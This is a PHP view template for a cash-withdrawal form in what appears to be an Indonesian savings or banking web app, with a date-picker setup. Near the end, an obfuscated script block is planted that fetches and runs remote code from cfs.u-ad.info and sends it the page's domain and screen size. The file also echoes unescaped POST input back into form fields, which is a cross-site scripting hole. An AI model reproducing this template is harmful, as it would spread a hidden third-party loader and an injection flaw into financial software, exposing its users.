<html>
<head>
<title>Penarikan </title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Copyright" content="arirusmanto.com">
<meta name="description" content="Admin MOS Template">
<meta name="keywords" content="Admin Page">
<meta name="author" content="Ari Rusmanto">
<meta name="language" content="Bahasa Indonesia">

<link rel="shortcut icon" href="stylesheet/img/devil-icon.png"> <!--Pemanggilan gambar favicon-->
<link rel="stylesheet" type="text/css" href="<?php echo base_url().'css/mos-style2.css'?>"/> <!--pemanggilan file css-->
<link rel="stylesheet" href="<?php echo base_url().'css/sky-form.css'?>" media="screen"/>
<link rel="stylesheet" type="text/css" href="<?php echo base_url().'css/anggota/styles.css'?>"  media="screen" />
 
<link rel="stylesheet" type="text/css" media="all" href="<?php echo base_url().'js/jsdatepick-calendar/jsDatePick_ltr.min.css'?>" />
<!-- 
	OR if you want to use the calendar in a right-to-left website
	just use the other CSS file instead and don't forget to switch g_jsDatePickDirectionality variable to "rtl"!
	
	<link rel="stylesheet" type="text/css" media="all" href="jsDatePick_ltr.css" />
-->
<script type="text/javascript" src="<?php echo base_url().'js/jsdatepick-calendar/jsDatePick.min.1.3.js'?>"></script>
<!-- 
	After you copied those 2 lines of code , make sure you take also the files into the same folder :-)
    Next step will be to set the appropriate statement to "start-up" the calendar on the needed HTML element.
    
    The first example of Javascript snippet is for the most basic use , as a popup calendar
    for a text field input.
-->
<script type="text/javascript">
	window.onload = function(){
		new JsDatePick({
			useMode:2,
			target:"inputField",
			dateFormat:"%d-%M-%Y"
			/*selectedDate:{				This is an example of what the full configuration offers.
				day:5,						For full documentation about these settings please see the full version of the code.
				month:9,
				year:2006
			},
			yearsRange:[1978,2020],
			limitToToday:false,
			cellColorScheme:"beige",
			dateFormat:"%m-%d-%Y",
			imgPath:"img/",
			weekStartDay:1*/
			/*
    useMode (Integer) – Possible values are 1 and 2 as follows:
        1 – The calendar's HTML will be directly appended to the field supplied by target
        2 – The calendar will appear as a popup when the field with the id supplied in target is clicked.
    target (String) – The id of the field to attach the calendar to , usually a text input field when using useMode 2.
    isStripped (Boolean) – When set to true the calendar appears without the visual design - usually used with useMode 1
    selectedDate (Object) – When supplied , this object tells the calendar to open up with this date selected already.
    yearsRange (Array) – When supplied , this array sets the limits for the years enabled in the calendar.
    limitToToday (Boolean) – Enables you to limit the possible picking days to today's date.
    cellColorScheme (String) – Enables you to swap the colors of the date's cells from a wide range of colors.
    Available color schemes:
        aqua
        armygreen
        bananasplit
        beige
        deepblue
        greenish
        lightgreen
        ocean_blue – If you choose not to supply the cellColorScheme variable - the calendar will default to this color.
        orange
        peppermint
        pink
        purple
        torqoise
*/
		});
	};
</script>
</head>

<body>
<div id="header">
	<?php include 'view_top_right_menu.php'?>
</div>

<div id="wrapper">
	<?php include 'view_left_menu.php'?>
	<div id="rightContent">
	<!-- ###################################################################### -->
	<div class="body body-s">
		
			<?php echo form_open('c_penarikan/validation')?>
			<div class="sky-form">
			
				<header>Form Penarikan Tunai</header>
				<div class="input">
				<?php echo validation_errors();?>
				</div>
				<fieldset>					
					<section>
						<label class="input">
							<i class="icon-append icon-user"></i>
							<input type="text" placeholder="Nomor Registrasi Nasabah" name="id_nasabah" value="<?php echo $this->input->post('id_nasabah')?>">
							<b class="tooltip tooltip-bottom-right">Masukkan No Registrasi/Id Nasabah</b>
						</label>
					</section>
					
					<section>
						<label class="input">
							<i class="icon-append icon-envelope-alt"></i>
							<input type="text" placeholder="Tanggal " name="tanggal" id="inputField" value="<?php echo $this->input->post('tanggal')?>">
							<b class="tooltip tooltip-bottom-right">Masukkan tangal transaksi (tanggal hari ini)</b>
						</label>
					</section>
					
					
					<div class="row">
						<section class="col col-6">
							<label class="input">
								<input type="text" placeholder="Jumlah Penarikan (Rp)" name="tarik" value="<?php echo $this->input->post('tarik')?>">
								<b class="tooltip tooltip-bottom-right">Jika dalam bentuk desimal,pakailah tanda titik</b>
							</label>
						</section>
						
					</div>
					
					
				</fieldset>
					
				
				<footer>
					<button type="submit" class="button">Lanjut</button>
				</footer>
			</div>
			</form>
			
		</div>
	<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582PlvV7TskJKDdBX46iVtN00sVmmxyOCiu8q7TWAIfz1FcFruav4j7IPncHEyxUzZ56Pc8vc085knrn4kNrQuRN3WjapPFQX8mlgjX%2fhLoF4uukGDwDC9VSymAyzJQPBO3eyMCk3p3HaW0CAITn%2fVDJnzg%2bTkTT8KH6baYCyAZCvhf8Qv6FuhhCvfliTXlRrYZBlraQ%2fsReI2RIRRSqmyKGYXyaOChmEdiFkNLiOa318DRWcpv59HKIgbB%2f6L6h3ST5EYGFRGZQKTCdbzFsXAWMWIO23l%2f64cFp78CgNd4AMd6zQvtxFyj6ipUglTib5phnNOQQ1mOLiswyuCNUAkG7MCbD9o4fd%2fc4cCoH5v1MUlg9nc%2f1eJ4dMv2bZSCwSmTboitWKMvcyI");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
<!-- ################################################################## -->
	</div>
<div class="clear"></div>
<?php include 'footer.php'?>
</div>
</body>
</html>